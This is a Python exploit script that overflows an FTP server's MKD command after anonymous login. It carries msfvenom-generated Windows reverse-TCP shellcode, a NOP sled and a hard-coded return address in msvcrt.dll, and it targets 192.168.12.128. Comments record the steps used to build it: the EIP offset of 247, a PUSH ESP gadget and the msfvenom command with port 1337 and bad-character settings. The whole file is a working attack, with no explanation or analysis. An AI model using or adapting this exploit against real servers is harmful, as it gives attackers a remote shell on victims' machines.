#!/usr/bin/python

# author: @snwlol
# /opt/metasploit-framework/embedded/framework/tools/exploit
# pattern_offset.rb -q 69413269 // [EIP = 69413269]
# [*] Exact match at offset 247
# msvcrt.dll
# 77C11064 > 54   PUSH ESP
# NOP (No Operation Performed = \x90)
# msfvenom -p windows/shell_reverse_tcp LPORT=1337 -f python -v shellcode -b "\x64\x10\xC1\x77"

import socket
import sys

print("""   
                  __     __
  ___ ___ _    __/ /__  / /
 (_-</ _ \ |/|/ / / _ \/ / 
/___/_//_/__,__/_/\___/_/ 
                        EXPLOIT ~~DONE!!!
""")

shellcode = (
"\xbd\xc6\x3c\xf6\x08\xda\xc4\xd9\x74\x24\xf4"
"\x5f\x33\xc9\xb1\x52\x31\x6f\x12\x03\x6f\x12"
"\x83\x01\x38\x14\xfd\x71\xa9\x5a\xfe\x89\x2a"
"\x3b\x76\x6c\x1b\x7b\xec\xe5\x0c\x4b\x66\xab"
"\xa0\x20\x2a\x5f\x32\x44\xe3\x50\xf3\xe3\xd5"
"\x5f\x04\x5f\x25\xfe\x86\xa2\x7a\x20\xb6\x6c"
"\x8f\x21\xff\x91\x62\x73\xa8\xde\xd1\x63\xdd"
"\xab\xe9\x08\xad\x3a\x6a\xed\x66\x3c\x5b\xa0"
"\xfd\x67\x7b\x43\xd1\x13\x32\x5b\x36\x19\x8c"
"\xd0\x8c\xd5\x0f\x30\xdd\x16\xa3\x7d\xd1\xe4"
"\xbd\xba\xd6\x16\xc8\xb2\x24\xaa\xcb\x01\x56"
"\x70\x59\x91\xf0\xf3\xf9\x7d\x00\xd7\x9c\xf6"
"\x0e\x9c\xeb\x50\x13\x23\x3f\xeb\x2f\xa8\xbe"
"\x3b\xa6\xea\xe4\x9f\xe2\xa9\x85\x86\x4e\x1f"
"\xb9\xd8\x30\xc0\x1f\x93\xdd\x15\x12\xfe\x89"
"\xda\x1f\x00\x4a\x75\x17\x73\x78\xda\x83\x1b"
"\x30\x93\x0d\xdc\x37\x8e\xea\x72\xc6\x31\x0b"
"\x5b\x0d\x65\x5b\xf3\xa4\x06\x30\x03\x48\xd3"
"\x97\x53\xe6\x8c\x57\x03\x46\x7d\x30\x49\x49"
"\xa2\x20\x72\x83\xcb\xcb\x89\x44\x34\xa3\x90"
"\x92\xdc\xb6\x92\x9f\x25\x3e\x74\xf5\x45\x16"
"\x2f\x62\xff\x33\xbb\x13\x00\xee\xc6\x14\x8a"
"\x1d\x37\xda\x7b\x6b\x2b\x8b\x8b\x26\x11\x1a"
"\x93\x9c\x3d\xc0\x06\x7b\xbd\x8f\x3a\xd4\xea"
"\xd8\x8d\x2d\x7e\xf5\xb4\x87\x9c\x04\x20\xef"
"\x24\xd3\x91\xee\xa5\x96\xae\xd4\xb5\x6e\x2e"
"\x51\xe1\x3e\x79\x0f\x5f\xf9\xd3\xe1\x09\x53"
"\x8f\xab\xdd\x22\xe3\x6b\x9b\x2a\x2e\x1a\x43"
"\x9a\x87\x5b\x7c\x13\x40\x6c\x05\x49\xf0\x93"
"\xdc\xc9\x00\xde\x7c\x7b\x89\x87\x15\x39\xd4"
"\x37\xc0\x7e\xe1\xbb\xe0\xfe\x16\xa3\x81\xfb"
"\x53\x63\x7a\x76\xcb\x06\x7c\x25\xec\x02")

buffer = "\x90"*20 + shellcode
kill = "A"*247 + "\x64\x10\xC1\x77" + buffer + "C"*(749-len(buffer))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.12.128',21))
 
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + kill + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close